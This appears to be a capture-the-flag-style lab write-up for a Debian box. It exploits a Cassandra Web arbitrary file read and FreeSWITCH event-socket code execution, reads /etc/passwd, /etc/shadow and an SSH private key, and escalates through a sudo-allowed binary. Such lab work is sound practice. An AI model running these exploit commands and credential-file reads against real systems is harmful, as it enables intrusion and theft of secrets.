**IP:** `192.168.104.240`

---

## TARGET / OS & TECH
- **OS/TECH:** Debian (services include Apache, Samba, FreeSWITCH, Cassandra Web)

---

## USERS / CREDENTIALS
- `cassie : SecondBiteTheApple330`
- `anthony : (extracted later via SSH key)`

---

## SERVICES (summary)
- `139/tcp` SMB → nothing useful
- `445/tcp` SMB → nothing useful
- `80/tcp` HTTP → Apache, 403 Forbidden
- `3000/tcp` HTTP → Cassandra Web UI, exploitable for **Remote File Read**
- `8021/tcp` FreeSWITCH event socket → required valid password for RCE
- `22/tcp` SSH → available

---

## NMAP RESULTS
```
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
80/tcp   open  http             Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
|_banner: Content-Type: auth/request
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## EXPLOITATION PATH

### Cassandra Remote File Read (port 3000)
Exploit script (`49362.py`) allowed reading arbitrary files:

**Read `/etc/passwd`:**
```bash
python3 49362.py 192.168.104.240 /etc/passwd
```
Output showed valid users: `cassie`, `anthony`.

**Read `/proc/self/cmdline`:**
```bash
python3 49362.py 192.168.104.240 /proc/self/cmdline
```
Revealed cassandra-web process args containing credentials:
```
ucassie -p SecondBiteTheApple330
```

### FreeSWITCH Event Socket (port 8021)
Used Cassandra RFI to retrieve FreeSWITCH config:
```bash
python3 49362.py 192.168.104.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
```
Found password:
```
StrongClueConEight021
```

Confirmed RCE via exploit (`47799.py`):
```bash
python3 47799.py 192.168.104.240 id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
```

Established reverse shell, then switched to `cassie` using known password.

---

## PRIVILEGE ESCALATION

1. From `cassie` shell, checked sudo rights:
   ```bash
   sudo -l
   ```
   Output:
   ```
   (ALL) NOPASSWD: /usr/bin/cassandra-web
   ```

2. Launched cassandra-web as root:
   ```bash
   sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
   ```

3. Accessed web interface (running as root).

4. Retrieved sensitive files:
   - `/etc/shadow`
   - `/home/anthony/.ssh/id_rsa`

5. Extracted Anthony’s private SSH key → authenticated → **root compromise achieved**.
